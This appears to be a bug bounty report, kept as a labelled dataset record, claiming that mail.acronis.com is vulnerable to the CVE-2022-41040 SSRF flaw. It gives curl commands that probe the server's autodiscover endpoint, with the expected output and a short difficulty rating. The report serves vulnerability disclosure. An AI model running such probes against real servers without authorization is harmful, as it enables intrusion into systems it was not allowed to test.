title: mail.acronis.com is vulnerable to zero day vulnerability CVE-2022-41040
content:
Hello Acronis team,
Please run
curl -ksL -m5 -o /dev/null -I -w "%{http_code}" "https://mail.acronis.com/autodiscover/autodiscover.json?Email=autodiscover/autodiscover.json@outlook.com&Protocol=ActiveSync"
curl -ksL -m5 "https://mail.acronis.com/autodiscover/autodiscover.json?Email=autodiscover/autodiscover.json@outlook.com&Protocol=ActiveSync" | grep Protocol
and get following output
404 and {"Protocol":"ActiveSync","Url":"https://eas.outlook.com/Microsoft-Server-ActiveSync"}
Proving that mail.acronis.com is vulnerable to CVE-2022-41040
Poc video attached
Impact
SSRF can be used to for unauthorized actions or access to confidential data.
steps: Run the following curl command to check the HTTP status code: curl -ksL -m5 -o /dev/null -I -w "%{http_code}" "https://mail.acronis.com/autodiscover/autodiscover.json?Email=autodiscover/autodiscover.json@outlook.com&Protocol=ActiveSync"

Run the following curl command to check the response content: curl -ksL -m5 "https://mail.acronis.com/autodiscover/autodiscover.json?Email=autodiscover/autodiscover.json@outlook.com&Protocol=ActiveSync" | grep Protocol
vuln_description: The vulnerability is a Server-Side Request Forgery (SSRF) in mail.acronis.com, identified by the CVE-2022-41040. The attack exploits the autodiscover feature of the mail server, allowing an attacker to make unauthorized requests to internal or external systems, potentially leading to unauthorized actions or access to confidential data.
reason: The vulnerability involves a straightforward exploitation of a known vulnerability (CVE-2022-41040) using standard curl commands. The attack does not require multiple components, complex state manipulation, or novel logic. The interaction is direct and the steps to reproduce are simple and well-documented for this specific CVE.
